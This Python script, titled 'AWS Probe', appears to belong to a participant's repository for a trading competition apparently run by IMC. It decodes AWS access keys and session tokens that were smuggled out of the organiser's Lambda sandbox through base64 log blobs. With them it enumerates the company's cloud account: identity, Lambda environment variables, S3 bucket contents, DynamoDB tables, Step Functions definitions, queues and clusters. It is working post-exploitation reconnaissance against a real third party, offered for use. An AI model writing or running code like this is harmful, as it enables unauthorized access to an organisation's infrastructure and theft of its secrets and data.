"""
AWS Probe — Use extracted Lambda credentials to scope IMC's AWS account.

Usage:
  1. Submit imc_probe.py, download logs
  2. Run: python trader-logic/round-0/oracle/aws_probe.py <run_id>

  Or with direct credentials:
  python trader-logic/round-0/oracle/aws_probe.py --key ASIA... --secret 2Yk... --token IQo...
"""

import json, sys, os, base64, argparse

try:
    import boto3
    from botocore.config import Config
except ImportError:
    print("ERROR: pip install boto3")
    sys.exit(1)


def extract_creds_from_log(run_id):
    """Extract base64 credentials from probe log."""
    log_file = f"run-logs/round-0/troll/{run_id}/{run_id}.log"
    if not os.path.exists(log_file):
        print(f"Log not found: {log_file}")
        return None

    with open(log_file) as f:
        data = json.load(f)

    # Look for CREDS_B64 in lambda logs
    for entry in data.get('logs', []):
        llog = entry.get('lambdaLog') or ''
        if 'CREDS_B64' in llog:
            lines = llog.strip().split('\n')
            for i, line in enumerate(lines):
                if 'CREDS_B64' in line:
                    blob = ''.join(lines[i+1:]).strip()
                    return json.loads(base64.b64decode(blob))

    # Fallback: look for P4_B64 (env vars from older probes)
    for entry in data.get('logs', []):
        llog = entry.get('lambdaLog') or ''
        if 'P4_B64' in llog:
            lines = llog.strip().split('\n')
            for i, line in enumerate(lines):
                if 'P4_B64' in line:
                    blob = ''.join(lines[i+1:]).strip()
                    decoded = base64.b64decode(blob).decode()
                    env = {}
                    for pair in decoded.split('\n'):
                        if '=' in pair:
                            k, v = pair.split('=', 1)
                            env[k] = v
                    return {
                        'KEY': env.get('AWS_ACCESS_KEY_ID', ''),
                        'SECRET': env.get('AWS_SECRET_ACCESS_KEY', ''),
                        'TOKEN': env.get('AWS_SESSION_TOKEN', ''),
                        'REGION': env.get('AWS_REGION', 'eu-west-1'),
                    }

    print("No credentials found in log")
    return None


def probe(creds):
    """Run all AWS API calls with extracted credentials."""
    session = boto3.Session(
        aws_access_key_id=creds['KEY'],
        aws_secret_access_key=creds['SECRET'],
        aws_session_token=creds['TOKEN'],
        region_name=creds.get('REGION', 'eu-west-1'),
    )
    cfg = Config(connect_timeout=5, read_timeout=10)

    print("=" * 60)
    print("  AWS ACCOUNT PROBE")
    print("=" * 60)

    # 1. Identity
    print("\n=== 1. WHO AM I ===")
    try:
        sts = session.client('sts', config=cfg)
        print(json.dumps(sts.get_caller_identity(), indent=2, default=str))
    except Exception as e:
        print(f"  STS: {e}")

    # 2. Lambda functions
    print("\n=== 2. LAMBDA FUNCTIONS ===")
    try:
        lam = session.client('lambda', config=cfg)
        funcs = lam.list_functions(MaxItems=50)
        for fn in funcs.get('Functions', []):
            print(f"  {fn['FunctionName']}")
            print(f"    Runtime: {fn.get('Runtime', '?')}")
            print(f"    Handler: {fn.get('Handler', '?')}")
            print(f"    Desc: {fn.get('Description', '')[:100]}")
            print(f"    LastModified: {fn.get('LastModified', '?')}")
            # Try to get env vars
            try:
                env = fn.get('Environment', {}).get('Variables', {})
                if env:
                    print(f"    ENV: {json.dumps(env, indent=6)[:500]}")
            except:
                pass
            print()
    except Exception as e:
        print(f"  Lambda: {e}")

    # 3. S3 buckets
    print("\n=== 3. S3 BUCKETS ===")
    try:
        s3 = session.client('s3', config=cfg)
        for b in s3.list_buckets().get('Buckets', []):
            print(f"  {b['Name']} (created: {b['CreationDate']})")
            # Try listing objects
            try:
                objs = s3.list_objects_v2(Bucket=b['Name'], MaxKeys=10)
                for obj in objs.get('Contents', [])[:5]:
                    print(f"    {obj['Key']} ({obj['Size']}b)")
            except Exception as e:
                print(f"    list objects: {e}")
    except Exception as e:
        print(f"  S3: {e}")

    # 4. DynamoDB
    print("\n=== 4. DYNAMODB ===")
    try:
        ddb = session.client('dynamodb', config=cfg)
        tables = ddb.list_tables().get('TableNames', [])
        print(f"  Tables: {tables}")
        for t in tables[:5]:
            try:
                desc = ddb.describe_table(TableName=t)['Table']
                print(f"  {t}: {desc['ItemCount']} items, {desc['TableSizeBytes']}b")
            except:
                pass
    except Exception as e:
        print(f"  DDB: {e}")

    # 5. CloudWatch Logs
    print("\n=== 5. CLOUDWATCH LOGS ===")
    try:
        cw = session.client('logs', config=cfg)
        groups = cw.describe_log_groups(logGroupNamePrefix='/aws/lambda/')
        for g in groups.get('logGroups', []):
            print(f"  {g['logGroupName']} ({g.get('storedBytes', 0)}b)")
    except Exception as e:
        print(f"  CW: {e}")

    # 6. API Gateway
    print("\n=== 6. API GATEWAY ===")
    try:
        apigw = session.client('apigateway', config=cfg)
        apis = apigw.get_rest_apis(limit=10)
        for api in apis.get('items', []):
            print(f"  {api['name']} ({api['id']})")
    except Exception as e:
        print(f"  APIGW: {e}")

    # 7. Step Functions
    print("\n=== 7. STEP FUNCTIONS ===")
    try:
        sf = session.client('stepfunctions', config=cfg)
        machines = sf.list_state_machines(maxResults=10)
        for m in machines.get('stateMachines', []):
            print(f"  {m['name']}: {m['stateMachineArn']}")
            # Try to get the definition
            try:
                desc = sf.describe_state_machine(stateMachineArn=m['stateMachineArn'])
                print(f"    Definition: {desc['definition'][:500]}")
            except:
                pass
    except Exception as e:
        print(f"  SF: {e}")

    # 8. SQS
    print("\n=== 8. SQS ===")
    try:
        sqs = session.client('sqs', config=cfg)
        queues = sqs.list_queues()
        for q in queues.get('QueueUrls', []):
            print(f"  {q}")
    except Exception as e:
        print(f"  SQS: {e}")

    # 9. ECS
    print("\n=== 9. ECS ===")
    try:
        ecs = session.client('ecs', config=cfg)
        clusters = ecs.list_clusters()
        for c in clusters.get('clusterArns', []):
            print(f"  {c}")
    except Exception as e:
        print(f"  ECS: {e}")

    print("\n" + "=" * 60)
    print("  PROBE COMPLETE")
    print("=" * 60)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('run_id', nargs='?', help='Run ID to extract creds from')
    parser.add_argument('--key', help='AWS_ACCESS_KEY_ID')
    parser.add_argument('--secret', help='AWS_SECRET_ACCESS_KEY')
    parser.add_argument('--token', help='AWS_SESSION_TOKEN')
    parser.add_argument('--region', default='eu-west-1')
    args = parser.parse_args()

    if args.key and args.secret:
        creds = {'KEY': args.key, 'SECRET': args.secret, 'TOKEN': args.token or '', 'REGION': args.region}
    elif args.run_id:
        creds = extract_creds_from_log(args.run_id)
        if not creds:
            sys.exit(1)
    else:
        # Default: use run 8984 creds (likely expired)
        creds = extract_creds_from_log('8984')
        if not creds:
            print("Usage: python aws_probe.py <run_id>  OR  python aws_probe.py --key X --secret Y --token Z")
            sys.exit(1)

    print(f"Using credentials: KEY={creds['KEY'][:10]}... REGION={creds['REGION']}")
    probe(creds)
